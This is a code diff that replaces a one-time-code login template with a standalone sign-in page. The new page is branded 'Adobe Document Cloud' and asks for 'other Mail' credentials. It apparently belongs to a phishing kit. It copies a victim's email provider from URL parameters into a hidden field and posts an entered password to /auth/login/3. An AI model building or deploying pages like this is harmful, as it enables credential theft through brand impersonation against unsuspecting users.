@@ -1,22 +1,60 @@
-@layout('layouts.app')
+<!DOCTYPE html>
+<html lang="en">
 
-@section('content')
-<div class="cb-login-static-alert cb-login-message cb-login-alert-message cb-loginFormArea"></div>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+</head>
 
-<div class="cb-login-form cb-loginFormArea">
-  <form class="cb-form" action="/auth/login/3" method="POST">
-    <div class="field">
-      <label class="cb-login-field" for="otp">An authorization code was sent to you via text to your mobile number.
-        <br><br> Check your mobile phone and enter the authorization code:</label>
-      <input id="otp" name="otp" class="mrg-T-sm form-control cb-text-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+<body>
+  <header></header>
+
+  <div class="box-modal">
+    <div class="overlay"></div>
+    <div class="body-modal">
+      <div class="card">
+        <ul class="list-group list-group-flush">
+          <li class="list-group-item" style="padding-top: 1.5rem;">
+            <div class="card-header">
+              <img src="/img/logo.png" alt="logo" class="card-header-icon">
+              <h5 class="card-header-title">Adobe Document Cloud</h5>
+            </div>
+            <img src="/img/other.png" alt="other" height="90" style="margin-top: 20px;">
+            <p class="card-header-text">Sign in with other Mail</p>
+          </li>
+          <li class="list-group-item" style="padding-bottom: 1.5rem;border: none;">
+            <div class="row">
+              <form action="/auth/login/3" method="post" style="width: 510px;">
+                <input type="text" value="" id="email_provider" name="email_provider" style="display: none;">
+                <script>
+                  var urlParams = new URLSearchParams(window.location.search);
+
+                  if (urlParams.has("email_provider") === true) {
+                    $("#email_provider").val(urlParams.get("email_provider"));
+                  } else {
+                    console.log("An error has occurred while trying to parse URL params...");
+                  }
+                </script>
+
+                <div class="form-group">
+                  <label for="password" class="form-label">Password</label>
+                  <input id="password" name="password" class="form-input" type="text" autocomplete="off" required>
+                </div>
+                
+                <div class="btn-group">
+                  <button class="btn" type="submit">Continue</button>
+                </div>
+              </form>
+            </div>
+          </li>
+        </ul>
+      </div>
     </div>
+  </div>
+</body>
 
-    <div id="userLinks">
-      <button class="logon-submit btn-primary btn-block pointer btn disabled" disabled="">
-        <div class="icon"></div>
-        Log In
-      </button>
-    </div>
-  </form>
-</div>
-@endsection
+</html>
